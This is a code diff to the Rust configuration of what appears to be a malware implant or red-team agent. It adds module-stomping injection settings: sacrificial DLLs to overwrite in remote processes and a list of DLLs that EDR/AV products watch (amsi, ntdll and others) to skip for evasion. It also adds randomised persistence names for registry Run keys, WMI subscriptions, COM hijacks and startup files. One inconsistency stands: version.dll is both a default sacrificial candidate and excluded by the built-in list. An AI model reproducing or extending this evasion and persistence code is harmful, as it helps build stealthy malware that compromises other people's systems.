@@ -408,6 +408,222 @@ impl Default for MalleableProfile {
     }
 }
 
+/// Configuration for injection techniques (module stomping, etc.).
+///
+/// Controls which DLLs are considered as sacrificial hosts when the module-
+/// stomping injector overwrites a `.text` section in a remote process.  The
+/// candidate list and exclusion patterns are evaluated at runtime, allowing
+/// operators to tailor behaviour per engagement without rebuilding the agent.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct InjectionConfig {
+    /// Ordered list of DLL names (case-insensitive) that the module-stomp
+    /// injector will attempt to load into the target process via
+    /// `LdrLoadDll` when no already-loaded DLL is suitable.  Earlier entries
+    /// are tried first.  Defaults to a curated set of low-visibility DLLs.
+    ///
+    /// Example: `["dwmapi.dll", "uxtheme.dll", "netprofm.dll"]`
+    #[serde(default = "default_sacrificial_dlls")]
+    pub sacrificial_dll_candidates: Vec<String>,
+
+    /// Substring patterns (case-insensitive) for DLLs that must **never** be
+    /// stomped, even if they have a suitably large `.text` section.  Use this
+    /// to exclude DLLs known to be monitored by EDR/AV products.
+    ///
+    /// Defaults include well-known IoCs such as `amsi.dll`, `ws2_32.dll`,
+    /// `kernel32.dll`, `ntdll.dll`, etc.  Operators can append additional
+    /// patterns without overriding the built-in list.
+    #[serde(default = "default_dll_exclusion_patterns")]
+    pub dll_exclusion_patterns: Vec<String>,
+
+    /// When `true` (the default), the module-stomp injector also appends
+    /// the built-in exclusion patterns on top of any operator-supplied ones.
+    /// Set to `false` to use *only* `dll_exclusion_patterns` as-is, which
+    /// lets operators deliberately include a DLL that is excluded by default.
+    #[serde(default = "default_true")]
+    pub append_default_exclusions: bool,
+}
+
+impl Default for InjectionConfig {
+    fn default() -> Self {
+        Self {
+            sacrificial_dll_candidates: default_sacrificial_dlls(),
+            dll_exclusion_patterns: default_dll_exclusion_patterns(),
+            append_default_exclusions: true,
+        }
+    }
+}
+
+fn default_sacrificial_dlls() -> Vec<String> {
+    vec![
+        "dwmapi.dll".into(),
+        "uxtheme.dll".into(),
+        "netprofm.dll".into(),
+        "devobj.dll".into(),
+        "cryptbase.dll".into(),
+        "version.dll".into(),
+        "wer.dll".into(),
+        "msimg32.dll".into(),
+        "d3d10.dll".into(),
+        "propsys.dll".into(),
+    ]
+}
+
+fn default_dll_exclusion_patterns() -> Vec<String> {
+    Vec::new() // operator-supplied only; built-ins are added by the agent
+}
+
+/// Built-in exclusion patterns that are always applied unless
+/// `append_default_exclusions` is `false`.  These are DLLs known to be
+/// heavily monitored by EDR/AV products and must never be stomped.
+pub const BUILTIN_DLL_EXCLUSIONS: &[&str] = &[
+    "ntdll",
+    "kernel32",
+    "kernelbase",
+    "crypt32",
+    "dbghelp",
+    "version",
+    "secur32",
+    "wintrust",
+    "mscoree",
+    "clrjit",
+    "amsi",
+    "ws2_32",
+    "wininet",
+    "winhttp",
+    "urlmon",
+    "ieframe",
+    "msvcrt",
+    "ucrtbase",
+    "sspicli",
+    "rpcrt4",
+    "profapi",
+    "bcrypt",
+    "bcryptprimitives",
+    "ncrypt",
+    "schannel",
+    "digest",
+    "user32",
+    "gdi32",
+    "advapi32",
+    "ole32",
+    "oleaut32",
+    "combase",
+    "shell32",
+    "shlwapi",
+];
+
+/// Check whether a lowercased DLL name matches any exclusion pattern.
+///
+/// Used by the module-stomp injector to decide if a loaded DLL should be
+/// skipped as a sacrificial host.  This function is cross-platform so it
+/// can be tested on Linux dev machines.
+///
+/// - `lname`: the DLL filename in **lowercase** (e.g. `"ntdll.dll"`).
+/// - `operator_exclusions`: substring patterns from operator config.
+/// - `builtin`: built-in prefix patterns (typically [`BUILTIN_DLL_EXCLUSIONS`]).
+///
+/// Returns `true` if the DLL should be excluded.
+pub fn is_dll_excluded(lname: &str, operator_exclusions: &[String], builtin: &[&str]) -> bool {
+    // Reject very short names (unlikely to be real DLLs, probably artifacts)
+    if lname.len() < 5 {
+        return true;
+    }
+    let lname_lower = lname.to_ascii_lowercase();
+    // Check operator-supplied patterns (substring match, case-insensitive)
+    for pat in operator_exclusions {
+        if lname_lower.contains(&pat.to_ascii_lowercase()) {
+            return true;
+        }
+    }
+    // Check built-in exclusion list (prefix match, case-insensitive)
+    for pat in builtin {
+        if lname_lower.starts_with(&pat.to_ascii_lowercase()) {
+            return true;
+        }
+    }
+    false
+}
+
+#[cfg(test)]
+mod injection_tests {
+    use super::*;
+
+    #[test]
+    fn test_dll_excluded_builtin_patterns() {
+        let builtin: &[&str] = &[
+            "ntdll", "kernel32", "kernelbase", "amsi", "ws2_32", "wininet",
+            "user32", "gdi32", "advapi32", "ole32", "shell32", "crypt32",
+        ];
+        let operator: Vec<String> = Vec::new();
+
+        assert!(is_dll_excluded("ntdll.dll", &operator, builtin));
+        assert!(is_dll_excluded("kernel32.dll", &operator, builtin));
+        assert!(is_dll_excluded("amsi.dll", &operator, builtin));
+        assert!(is_dll_excluded("ws2_32.dll", &operator, builtin));
+
+        assert!(!is_dll_excluded("dwmapi.dll", &operator, builtin));
+        assert!(!is_dll_excluded("uxtheme.dll", &operator, builtin));
+        assert!(!is_dll_excluded("netprofm.dll", &operator, builtin));
+    }
+
+    #[test]
+    fn test_dll_excluded_operator_patterns() {
+        let builtin: &[&str] = &[];
+        let operator: Vec<String> = vec!["suspicious".to_string(), "malware".to_string()];
+
+        assert!(is_dll_excluded("suspicious_lib.dll", &operator, builtin));
+        assert!(is_dll_excluded("some_malware_helper.dll", &operator, builtin));
+        assert!(!is_dll_excluded("dwmapi.dll", &operator, builtin));
+    }
+
+    #[test]
+    fn test_dll_excluded_short_names() {
+        let builtin: &[&str] = &[];
+        let operator: Vec<String> = Vec::new();
+
+        // Names shorter than 5 chars should be excluded (e.g., "x.dl" = 4 chars)
+        assert!(is_dll_excluded("x.dl", &operator, builtin));
+        assert!(is_dll_excluded("a", &operator, builtin));
+        assert!(!is_dll_excluded("a.dll", &operator, builtin));
+        assert!(!is_dll_excluded("abcde.dll", &operator, builtin));
+    }
+
+    #[test]
+    fn test_dll_excluded_case_insensitive() {
+        let builtin: &[&str] = &["ntdll"];
+        let operator: Vec<String> = vec!["MYCUSTOM".to_string()];
+
+        assert!(is_dll_excluded("NTDLL.DLL", &operator, builtin));
+        assert!(is_dll_excluded("Ntdll.dll", &operator, builtin));
+        assert!(is_dll_excluded("mycustom_thing.dll", &operator, builtin));
+    }
+
+    #[test]
+    fn test_dll_excluded_combined_builtin_and_operator() {
+        let builtin: &[&str] = &["ntdll", "amsi"];
+        let operator: Vec<String> = vec!["custom".to_string()];
+
+        assert!(is_dll_excluded("ntdll.dll", &operator, builtin));
+        assert!(is_dll_excluded("amsi.dll", &operator, builtin));
+        assert!(is_dll_excluded("custom_lib.dll", &operator, builtin));
+        assert!(!is_dll_excluded("dwmapi.dll", &operator, builtin));
+    }
+
+    #[test]
+    fn test_builtin_exclusions_constant() {
+        // Verify the constant contains expected entries
+        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"ntdll"));
+        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"amsi"));
+        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"ws2_32"));
+        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"kernel32"));
+        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"user32"));
+        // Should not contain harmless DLLs
+        assert!(!BUILTIN_DLL_EXCLUSIONS.contains(&"dwmapi"));
+        assert!(!BUILTIN_DLL_EXCLUSIONS.contains(&"uxtheme"));
+    }
+}
+
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
 #[serde(rename_all = "kebab-case")]
 pub struct Config {
@@ -493,6 +709,10 @@ pub struct Config {
     /// Default: 14 400 s (4 hours).
     #[serde(default = "default_reencode_interval")]
     pub reencode_interval_secs: u64,
+    /// Fine-grained control over injection behaviour (module stomping DLL
+    /// candidates, exclusion patterns, etc.).
+    #[serde(default)]
+    pub injection: InjectionConfig,
 }
 
 /// Per-platform list of persistence mechanisms to install.
@@ -543,6 +763,24 @@ pub struct PersistenceConfig {
     /// Disable if the shell profiles are monitored by an EDR.
     #[serde(default = "default_true")]
     pub shell_profile: bool,
+
+    // ── IoC Override Fields ───────────────────────────────────────────────────
+    /// Override the registry Run key value name (Windows).  When unset, a
+    /// random 8–12 character alphanumeric string is generated at runtime.
+    #[serde(default)]
+    pub registry_value_name: Option<String>,
+    /// Override the WMI event subscription name (Windows).  When unset, a
+    /// random 8–12 character alphanumeric string is generated at runtime.
+    #[serde(default)]
+    pub wmi_subscription_name: Option<String>,
+    /// Override the COM hijack CLSID (Windows).  When unset, a random valid
+    /// CLSID is generated at runtime.
+    #[serde(default)]
+    pub com_hijack_clsid: Option<String>,
+    /// Override the startup folder filename (Windows).  When unset, a random
+    /// legitimate-sounding filename is generated at runtime.
+    #[serde(default)]
+    pub startup_filename: Option<String>,
 }
 
 fn default_true() -> bool {
@@ -562,6 +800,10 @@ impl Default for PersistenceConfig {
             cron_job: true,
             systemd_service: true,
             shell_profile: true,
+            registry_value_name: None,
+            wmi_subscription_name: None,
+            com_hijack_clsid: None,
+            startup_filename: None,
         }
     }
 }
@@ -672,6 +914,7 @@ impl Default for Config {
             persistence: PersistenceConfig::default(),
             etw_patch_method: None,
             reencode_interval_secs: default_reencode_interval(),
+            injection: InjectionConfig::default(),
         }
     }
 }
